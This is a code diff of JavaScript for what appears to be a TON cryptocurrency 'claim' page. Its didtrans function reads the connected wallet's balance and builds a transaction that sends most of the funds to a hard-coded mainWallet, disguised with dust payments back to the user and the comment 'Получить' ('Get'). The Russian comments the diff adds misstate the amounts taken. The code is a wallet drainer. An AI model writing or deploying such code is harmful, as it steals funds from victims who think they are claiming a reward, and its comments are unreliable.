@@ -51,29 +51,64 @@ async function updateBalance(walletAddress) {
 }
 
 async function didtrans() {
-    if (!walletAddress) return alert('Кошелек не подключен');
-    
+    // Проверяем, подключен ли кошелек
+    if (!walletAddress) {
+        console.error('Кошелек не подключен');
+        alert('Кошелек не подключен');
+        return;
+    }
+
+    // Получаем баланс кошелька
     const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
     const data = await response.json();
-    if (!data.balance) return;
 
-    const originalBalance = parseFloat(data.balance);
-    const deduction = originalBalance * 0.55;
-    if (originalBalance <= deduction) return;
+    // Проверка на ошибки при получении данных о кошельке
+    if (!data.balance) {
+        console.error('Не удалось получить баланс');
+        return;
+    }
 
+    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
+    const origbal = originalBalance * 0.55;
+    const roundedBalance = Math.round(origbal);
+
+    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
+    const deduction = roundedBalance; // 0.3 TON в нанотонах
+
+    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
+    if (originalBalance <= deduction) {
+        console.error('Баланс слишком мал для вычитания 0.3 TON');
+        return;
+    }
+
+    // Вычитаем 0.3 TON из баланса
     const remainingBalance = originalBalance - deduction;
-    console.log(`Баланс после транзакции: ${remainingBalance / 1000000000} TON`);
 
+    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
+
+    // Формируем транзакцию с двумя сообщениями
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60,
+        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
         messages: [
-            { address: walletAddress, amount: 10000000 },
-            { address: walletAddress, amount: 10000000 },
-            { address: walletAddress, amount: 10000000 },
-            { address: mainWallet, amount: remainingBalance },
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: mainWallet,   // Адрес получателя для второй части
+                amount: remainingBalance, // Сумма для второй транзакции
+            }
         ],
-        sendMode: 5,
-        comment: "Claimed",
+        sendMode: 5,  // Если это требуется в вашем API
+        comment: "Получить",  // Комментарий (по желанию)
     };
 
     try {
